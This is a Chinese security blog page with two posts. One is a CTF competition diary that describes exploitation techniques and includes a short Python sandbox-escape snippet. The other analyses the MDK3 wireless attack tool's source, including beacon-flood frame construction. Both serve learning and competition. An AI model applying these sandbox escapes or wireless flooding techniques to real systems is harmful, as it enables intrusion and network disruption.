<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>DazzleP&#39;s Blog</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="A poor bin dog from ROIS@FZU">
<meta property="og:type" content="website">
<meta property="og:title" content="DazzleP&#39;s Blog">
<meta property="og:url" content="http://blog.dazzlepppp.cn/index.html">
<meta property="og:site_name" content="DazzleP&#39;s Blog">
<meta property="og:description" content="A poor bin dog from ROIS@FZU">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="DazzleP&#39;s Blog">
<meta name="twitter:description" content="A poor bin dog from ROIS@FZU">
  
    <link rel="alternative" href="/atom.xml" title="DazzleP&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
  
  <link rel="stylesheet" href="/css/style.css">
  
  

  <script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>

  
</head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">DazzleP</a></h1>
		</hgroup>

		
		<p class="header-subtitle">A simple record place</p>
		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/code/" style="font-size: 10px;">code</a> <a href="/tags/coding/" style="font-size: 10px;">coding</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/elf-structure/" style="font-size: 10px;">elf-structure</a> <a href="/tags/glibc，pwn/" style="font-size: 10px;">glibc，pwn</a> <a href="/tags/heap/" style="font-size: 13.33px;">heap</a> <a href="/tags/homework/" style="font-size: 10px;">homework</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/offline/" style="font-size: 10px;">offline</a> <a href="/tags/pwn/" style="font-size: 16.67px;">pwn</a> <a href="/tags/tour/" style="font-size: 10px;">tour</a> <a href="/tags/writeup/" style="font-size: 16.67px;">writeup</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
			        
			        </div>
				</section>
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">DazzleP</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author">DazzleP</h1>
			</hgroup>
			
			<p class="header-subtitle">A simple record place</p>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-深圳-chuan-五日游" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/06/11/深圳-chuan-五日游/" class="article-date">
  	<time datetime="2017-06-11T10:57:52.000Z" itemprop="datePublished">2017-06-11</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/06/11/深圳-chuan-五日游/">
        深圳(chuan)五日游
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>在0ctf线上赛，我们和西电的L-team组成了G190X战队，取得了不错的成绩，虽然没进0CTF决赛，但还是拿到了萌新邀请赛的资格，冠军有机会受鹅厂资助去vegas  </p>
<h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><p>下午到达深圳后去到酒店，见到了小金子，发现队伍的指导老师住的地方和选手住的地方不一样，似乎是指导老师有其他活动。。。？<br>晚上八点左右蓝猫师傅去领了比赛的T恤还有选手牌，抽签决定赛场位置时发现我们和0ctf决赛的队伍是同一个场地，也就是说我们很有可能和他们做的是一套题<br>我们入住的酒店。。。其他的没啥，就是网速太拙计了，基本属于啥都干不了的状态，晚上拿KGGG的switch玩了几把，然后早早休息了，第二天是jeopardy所以也没啥好准备的  </p>
<h2 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h2><p>昨晚上主办方给每个队伍发了T恤，但是不是一定要在比赛的时候穿，所以我们还是穿的我们自己的衣服，但是在酒店餐厅吃早饭的时候发现国内dalao们好像都穿了。。<br>到达场地后，发现我们的位置正对着场地边上的灯光(我们的位置在场地边缘)，蓝光照脸怎么玩。。。？不过后来灯光调暗了就不影响了<br>每个队伍的位置给了四条网线，连上需要配置静态IP，但不知为何小金子的mac老是失败，于是乎还是用了我的路由器来配置<br>比赛开始后放了大量的题目，web，pwn都很多，但只有一个misc，后来又放了一个crypto<br>大概浏览了一遍，决定先从world of fast bin下手，略微分析了下发现这个程序的逻辑和线上赛的babyheap几乎一样，不一样的是限制了可分配chunk的大小，<br>不能大于0x58，构造heap overlap后leak出堆地址和libc，发现远程服务器的堆地址最高位0x55~0x56之间，也就是说fastbin attack修改top chunk指针的方法还是能用，之后遍交给小金子完成了<br>然后我就去看python了，题给了个python命令行程序，保留了符号表，但是代码量很大，IDA分析半天没啥头绪，而且程序没有os, command， subprocess等模块，无法执行命令<br>交给kggg分析，看能不能搞出个文件读写来读flag，kggg试了几次给出了这样一个有效的poc<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(fn, mode=<span class="string">'r'</span>)</span>:</span></div><div class="line">    <span class="keyword">import</span> sys</div><div class="line">    file = sys.stdin.__class__</div><div class="line">    f=file.__new__(file)</div><div class="line">    f.__init__(fn, mode)</div><div class="line">    <span class="keyword">return</span> f</div></pre></td></tr></table></figure></p>
<p>大概原理就是，一个类的对象包含这个类的所有方法，包括对这个对象的初始化等等，这个程序允许使用sys模块，sys中有stdin，stdout，stderr这样的file object，<br>因此，file object的方法也都是可以使用，因此可以用那些方法创建出新的file object，然后就可以文件读写辣<br>之后就是尝试读flag，/home/python/flag, ./flag都是过了，服务端都没有这些文件，也就是说咱还得getshell然后去找flag<br>然后我的思路是写进程的mem,这样就可以修改这个已经在运行的进程的代码段来控制程序行为，但是很奇怪的是mem文件无法打开，按道理linux是允许进程写自己的mem的，后来发现是open的时候mode选错了。。。然后就是写exit@plt为shellcode，然后退出程序就可以getshell了，<br>后来发现我们是国内队伍FB ~_~<br>中间有个小插曲，说是0CTF那边LC/BC上0day做题了。。。不愧是毛子啊。。。<br>然后开始看upxof，这个题的程序是个带壳程序，壳是出题人手写的，运行时解壳需要输入password，不过很神奇的是这样也可以直接用linux的upx来解壳<br>整个题有俩洞，一个是解壳后的程序带canary的栈溢出，一个是程序解壳时输入password存在栈溢出，但是不知道咋用，分析了下觉得壳内的canary是绕不过的，<br>似乎是要利用解壳时的栈溢出，但是栈上没有返回地址给我们覆盖<br>后来想用ld.so的加载elf文件的过程，覆盖栈上的环境变量指针，让ld.so加载我们想要的东西，但是这个想法一是没实现，因为栈上的数据不能XJB改，调了半天exp都没成功，<br>二是我们要控制ld.so的加载，就一定会有一个之前正常执行时要加载的目标不会被加载，strace了一下程序发现没有啥东西是可以替代的。。。<br>第一天比赛结束，我们只解出了两个题，上一张排名，我们暂时排在第一<br><img src="/2017/06/11/深圳-chuan-五日游/day2scordboard.png" alt="day2scordboard" title="day2scordboard"><br>晚上回到酒店继续分析，kggg不久后解出wannacry，我继续看upxof，小金子看那个内核pwn<br>苦于实在无思路，我翻了下杨坤博士的那篇掘金CTF的slide，看下有没有其他的绕canary的方法，发现里面提到了，canary是由ld.so进行初始化的<br>于是遍着手调试跟踪，发现环境变量数据上面一部分数据是作为canary被ld.so使用的，整个过程大概是在加载elf的时候，从栈上取出那个特定数据，<br>然后将其放入TLS，然后程序运行时若需要canary，就从TLS中取出来，也就是说，如果能利用解壳时的栈溢出修改那个变量，我们就可以控制canary用壳内的栈溢出做<br>ROP了，不过还是那个原因，栈上的内容不能瞎改，所以EXP还是很难写，而且当时调试出来的时候已经挺晚了，困的要死，直接就睡了  </p>
<h2 id="Day-3"><a href="#Day-3" class="headerlink" title="Day 3"></a>Day 3</h2><p>到达赛场后，没多久小金子就写出了成功控制canary的poc，于是就可以做ROP辣，之后便完成了upxof，我们继续排在第一<br>于此同时，主办方又放了俩pwn。。。有个babystack看上去挺简单，我们就先做那个了<br>babystack是一个裸的栈溢出，保护全开，但是是跑在qemu下的，运行命令长这样<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">#!/bin/bash</span></div><div class="line"><span class="built_in">cd</span> `dirname <span class="variable">$0</span>`</div><div class="line"><span class="built_in">exec</span> ./qemu-x86_64 -B $((RANDOM * 4096)) ./app</div></pre></td></tr></table></figure></p>
<p>google了一波-B参数，发现是guest的offset啥的。。。没怎么看清楚，当时想法是和程序的ASLR有关<br>当时卡了好久，但是因为程序保护全开，而且函数返回时关掉了stdin和stderr，无法再次输入，只有一次ROP的话咋绕PIE和glibc aslr。。。？<br>挺长一段时间我们都想着这题其实是没法做的吧。。。不过0ctf那边shellphish很快就FB了，估计是有啥点可以绕<br>小金子找出了qemu下调试的方法，得用gdbserver，但是非常蛋疼的是无法用vmmap查看内存映射，而且断点十分难下，也无法在程序挂起时把程序断掉<br>硬着头皮调试，然后改运行命令的RANDOM值为特定值来看是否和ASLR有关，但是发现一个很诡异的情况，不管我RANDOM取啥值程序的基址都是不变的<br>这就非常诡异了，小金子的机子因为很奇怪的原因无法调试，没办法查看是不是我机子的问题，于是尝试了一波远程，发现远程服务器的程序基址和我本地的是一样的，而且也是固定的。。。<br>那这个PIE开了也白开啊。。。然后想做ROP来leak libc，来看看远程的libc是不是也是基址不随机的，但是非常尴尬的是程序里控制RDI的gadget的地址有个0x0a，输入时会被截断，<br>而且程序里没有其他好用的gadget了<br>之前调试的时候发现本地的LIBC是基址固定的，但是远程不确定，所以我们无法用libc里的gadget，但是之后像刀割梗，开启PIE的程序运行时<br>，其程序的基址和libc的基址之间的offset是固定的，具体的值和linux内核版本相关，于是写脚本爆破远程libc基址，运气很好，没爆多久就爆出来了<br>之后就是做ROP，刚开始是想反弹shell，但是本地测试发现无法创建socket套接字，也无法执行/bin/sh，似乎是qemu的原因，于是转而读flag，但是本地测试的时候一直无法打开flag文件，<br>试了几次又好了。。。简直诡异<br>这就是我们做出来的最后一个pwn了，其他的pwn实在是没啥思路，然后比赛就结束了，最后我们排在第三<br><img src="/2017/06/11/深圳-chuan-五日游/day3scordboard_1.png" alt="day3scordboard_1" title="day3scordboard_1"><br><img src="/2017/06/11/深圳-chuan-五日游/day3scordboard_2.png" alt="day3scordboard_2" title="day3scordboard_2"><br>然后上一张猫哥<br><img src="/2017/06/11/深圳-chuan-五日游/cat.jpg" alt="cat" title="cat"><br>然后就是颁奖典礼，先进行的是萌新邀请赛，我们作为季军第一个上场，然后是亚军的Nu1l和冠军AAA，冠亚季军每个队员的奖品是HHKB TYPE-S，<br>每个队分别是两个无刻两个有刻，无刻的比较贵，我拿到的是有刻的:P<br>然后作为冠军的AAA额外有0x4000(还是0x4400来着。。。？)RMB的奖金和vegas tour，可以说是非常羡慕了<br>之后是0ctf决赛的颁奖，每个队伍都有奖金，冠军奖金0x20000RMB，之后每一名除以2，冠军还有今年DEFCON CTF决赛的外卡<br>前三分别是Shellphish，217和binja，引人注目的是binja还来了个女黑阔，而且看来实力不俗，由于shellphish之前已有defcon的资格，217是作为hitcon的一员，这次比赛的外卡应该是给binja的<br>晚上回到酒店，酒店网络实在是蠢，只好b栈缓存清晰度最差的视频看看，然后玩玩switch，这中间猫哥出门社交，小金子回自己房间洗澡，217的队员来找我们问RCTF奖金的事情，结果他们俩的房间我进不去<br>只好和217的队员说奖金第二天晚宴的时候给他们  </p>
<h2 id="Day-4"><a href="#Day-4" class="headerlink" title="Day 4"></a>Day 4</h2><p>腾讯总部赛后复盘和选手晚宴<br>到达鹅厂后，工作人员给发了临时通行证，进到里面发现确实能看到挺多企鹅的。。。<br>复盘讲了挺久的，讲下还记得的点吧  </p>
<ol>
<li>有个web题，漏洞点啥的我忘了，但是实际利用一点也不web，灰常的二进制，但是毛子们可不管，直接上0day把sqlite日穿  </li>
<li>线上没人解出的starcrat，利用非常简单，读got然后写got，但是程序逻辑过于复杂，用到了线段树等数据结构，懂算法还是很重要的  </li>
<li>全场没人解出(我记得是)的RSA，来自某篇paper，果然paper才是水平的提现啊。。。</li>
<li>我们python的解法是非预期，预期解法是用py opcode做任意代码执行，但是讲道理既然考虑到了可以文件读写，应该也能考虑到mem的读写才对  </li>
<li>我们解出的其他pwn思路和出题人的预想差不多</li>
<li>babystack的qemu并不是虚拟机，而是类似于一个沙盒的东西，多了个31337的syscall来限制程序行为</li>
</ol>
<p>其他的也不大记得请了<br>然后吃中饭的时候，我们和binja的人在一块吃，好像有个天大的dalao搭讪binja的队员，秀了波日语，讲的还挺不错，反正比我这个整天看日漫的废宅好<br>GC的是，他们交谈的时候binja的“女”黑阔也说话了，怎么是个男人的声音。。。？不是女的么？WHY？？？？完全是一张女人脸，而且是标准的黑长直<br>后来才知道那位是日本著名的变装黑客，纯爷们，后来小金子还和我说，你没看到他的喉结么。。。  </p>
<p>晚宴的时候，遇到了科恩的聂博，交流了一波，小金子说我也面试过科恩，于是聂博问我具体的情况，我和他提了下，之后他就去其他地方了<br>然后让我惊讶的是陈良过来找我，说是要和我说下情况，目测是聂博过去和他提了下  </p>
<p>晚上回到酒店，顶着时不时断线的网络下好了巨人和埃罗芒阿老师最新话，结果小金子在自己房间里在我下好前就看完了:P<br>过后蓝猫师傅的好基友AAA的melody来送香蕉给我们吃，顺便一块儿看巨人，然后被我剧透一脸23333<br>后来玩switch玩到十二点左右，开了火猫看震中杯LFY打OG，妈呀好长时间没见的LFY猛地一笔直接2:0，看的好tm爽  </p>
<h2 id="Day-5"><a href="#Day-5" class="headerlink" title="Day 5"></a>Day 5</h2><p>下午飞机回福州，小金子回西安也是下午走，于是我们早上睡到饱才出的酒店，地铁还挺快，半个小时左右就到机场了，然后我们就分开各自找登机口去了  </p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这几天比赛累，但是玩的挺开心，赚了个HHKB，只是上面有TCTF的定制logo，不大好卖，作为windows用户用hhkb得适应一段时间，现在还是用的IKBC的青轴，上一张键盘做结尾吧<br><img src="/2017/06/11/深圳-chuan-五日游/keyboard.jpg" alt="keyboard" title="keyboard"> </p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/offline/">offline</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tour/">tour</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-MDK3源码分析" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/05/31/MDK3源码分析/" class="article-date">
  	<time datetime="2017-05-31T15:44:08.000Z" itemprop="datePublished">2017-05-31</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/05/31/MDK3源码分析/">
        MDK3源码分析
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>无线网络安全课的选题，我们组选得是无线网络恶意分析，然后我们最后选择的课题是MDK3工具的利用和分析，我的部分是分析MDK3的源码<br>在这里我要吐槽一下这个代码，缩进没有层次上的区分，再加上处理参数时用了大量的if-else结构和switch case，整个代码可读性基本就是一个差字,<br>而且处理参数为何不用getopt啊。。。</p>
<h2 id="main-函数分析"><a href="#main-函数分析" class="headerlink" title="main()函数分析"></a>main()函数分析</h2><p>大概截取一部分<code>main()</code>函数代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">switch</span> (argv[<span class="number">2</span>][<span class="number">0</span>]) &#123;</div><div class="line">	    <span class="keyword">case</span> <span class="string">'b'</span>:</div><div class="line">		<span class="built_in">printf</span>(use_beac);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	    <span class="keyword">case</span> <span class="string">'a'</span>:</div><div class="line">		<span class="built_in">printf</span>(use_auth);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	    <span class="keyword">case</span> <span class="string">'p'</span>:</div><div class="line">		<span class="built_in">printf</span>(use_prob);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	    <span class="keyword">case</span> <span class="string">'d'</span>:</div><div class="line">		<span class="built_in">printf</span>(use_deau);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	    <span class="keyword">case</span> <span class="string">'m'</span>:</div><div class="line">		<span class="built_in">printf</span>(use_mich);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	    <span class="keyword">case</span> <span class="string">'x'</span>:</div><div class="line">		<span class="built_in">printf</span>(use_eapo);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	    <span class="keyword">case</span> <span class="string">'w'</span>:</div><div class="line">		<span class="built_in">printf</span>(use_wids);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	    <span class="keyword">case</span> <span class="string">'f'</span>:</div><div class="line">		<span class="built_in">printf</span>(use_macb);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	    <span class="keyword">case</span> <span class="string">'g'</span>:</div><div class="line">		<span class="built_in">printf</span>(use_wpad);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	    <span class="keyword">default</span>:</div><div class="line">		<span class="built_in">printf</span>(use_head);</div><div class="line">        &#125; </div><div class="line"></div><div class="line"><span class="comment">/* open the replay interface */</span></div><div class="line">    _wi_out = wi_open(argv[<span class="number">1</span>]);</div><div class="line">    <span class="keyword">if</span> (!_wi_out)</div><div class="line">    	<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    dev.fd_out = wi_fd(_wi_out);</div><div class="line"></div><div class="line">    <span class="comment">/* open the packet source */</span></div><div class="line">    _wi_in = _wi_out;</div><div class="line">    dev.fd_in = dev.fd_out;</div><div class="line"></div><div class="line">    <span class="comment">/* XXX */</span></div><div class="line">    dev.arptype_in = dev.arptype_out;</div><div class="line"></div><div class="line">    <span class="comment">/* drop privileges */</span></div><div class="line"></div><div class="line">    setuid( getuid() );</div><div class="line"></div><div class="line">    <span class="keyword">int</span> retval = mdk_parser(argc, argv);</div><div class="line"></div><div class="line">    <span class="keyword">return</span>( retval );</div></pre></td></tr></table></figure></p>
<p><code>main()</code>函数初步的解析了程序运行的参数，参数不对的话打出对应的help，然后传给<code>mdk_parser()</code>进行进一步处理<br>同样的截取一部分代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">switch</span> (argv[<span class="number">2</span>][<span class="number">0</span>])</div><div class="line">    &#123;</div><div class="line">    <span class="keyword">case</span> <span class="string">'b'</span>:</div><div class="line">	mode = <span class="string">'b'</span>;</div><div class="line">	usespeed = <span class="number">1</span>;</div><div class="line">	<span class="keyword">for</span> (t=<span class="number">3</span>; t&lt;argc; t++)</div><div class="line">	&#123;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-n"</span>)) <span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) ssid = argv[t+<span class="number">1</span>];</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-f"</span>)) <span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) &#123;</div><div class="line">		<span class="keyword">if</span> (ssid_file_name == <span class="literal">NULL</span>) ssid_file_name = argv[t+<span class="number">1</span>];</div><div class="line">		<span class="keyword">else</span> &#123; <span class="built_in">printf</span>(use_beac); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-v"</span>)) <span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) &#123;</div><div class="line">		<span class="keyword">if</span> (ssid_file_name == <span class="literal">NULL</span>) &#123; ssid_file_name = argv[t+<span class="number">1</span>]; adv=<span class="number">1</span>; &#125;</div><div class="line">		<span class="keyword">else</span> &#123; <span class="built_in">printf</span>(use_beac); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-s"</span>)) <span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) pps = strtol(argv[t+<span class="number">1</span>], (<span class="keyword">char</span> **) <span class="literal">NULL</span>, <span class="number">10</span>);</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-c"</span>)) <span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) fchan = strtol(argv[t+<span class="number">1</span>], (<span class="keyword">char</span> **) <span class="literal">NULL</span>, <span class="number">10</span>);</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-h"</span>)) mode = <span class="string">'B'</span>;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-m"</span>)) random_mac = <span class="number">0</span>;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-w"</span>)) wep = <span class="number">1</span>;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-g"</span>)) gmode = <span class="number">1</span>;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-t"</span>)) wep = <span class="number">2</span>;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-a"</span>)) wep = <span class="number">3</span>;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-d"</span>)) adhoc = <span class="number">1</span>;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>getopt到底有啥不好的。。。非得这么麻烦<br>这里mode为b时使用的是beacon模式，用起来就是同时产生大量的fake ap，干扰用户的正常通信<br>这个工具还有强制认证解除模式，验证请求DOS攻击，探测AP爆破ESSID等，之后再讲</p>
<h2 id="Beacon模式"><a href="#Beacon模式" class="headerlink" title="Beacon模式"></a>Beacon模式</h2><p><code>parser()</code>函数对该模式的处理<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'B'</span>:</div><div class="line">	    <span class="keyword">if</span> ((nb_sent % <span class="number">30</span> == <span class="number">0</span>) || (total_time % <span class="number">3</span> == <span class="number">0</span>))  <span class="comment">// Switch Channel every 30 frames or 3 seconds</span></div><div class="line">	    &#123;</div><div class="line">		<span class="keyword">if</span> (fchan) &#123;</div><div class="line">		    set_channel(fchan);</div><div class="line">		    chan = fchan;</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">		    chan = generate_channel();</div><div class="line">		    set_channel(chan);</div><div class="line">		&#125;</div><div class="line">	    &#125;</div><div class="line">	    frm = create_beacon_frame(ssid, chan, wep, random_mac, gmode, adhoc, adv);</div><div class="line">	    <span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="string">'b'</span>:</div><div class="line">	    <span class="keyword">if</span> (fchan) chan = fchan;</div><div class="line">		<span class="keyword">else</span> chan = generate_channel();</div><div class="line">	    frm = create_beacon_frame(ssid, chan, wep, random_mac, gmode, adhoc, adv);</div><div class="line">	    <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
<p>大写的B就是指定特定信道的时候用，我们来看一下<code>create_beacon_frame()</code>函数用到的几个变量<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">  <span class="keyword">char</span> *hdr =	<span class="string">"\x80\x00\x00\x00\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00"</span></div><div class="line"><span class="string">"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"</span></div><div class="line"><span class="string">"\x64\x00\x05\x00\x00"</span>;</div><div class="line">  <span class="keyword">char</span> *param2 = <span class="string">"\x04\x06\x01\x02\x00\x00\x00\x00\x05\x04\x00\x01\x00\x00"</span>;</div><div class="line">  <span class="comment">//WPA-TKIP Tag</span></div><div class="line">  <span class="keyword">char</span> *wpatkip = <span class="string">"\xDD\x18\x00\x50\xF2\x01\x01\x00\x00\x50\xF2\x02\x01\x00\x00\x50\xF2\x02\x01\x00\x00\x50\xF2\x02\x00\x00"</span>;</div><div class="line">  <span class="comment">//WPA-AES Tag</span></div><div class="line">  <span class="keyword">char</span> *wpaaes = <span class="string">"\xDD\x18\x00\x50\xF2\x01\x01\x00\x00\x50\xF2\x04\x01\x00\x00\x50\xF2\x04\x01\x00\x00\x50\xF2\x02\x00\x00"</span>;</div></pre></td></tr></table></figure></p>
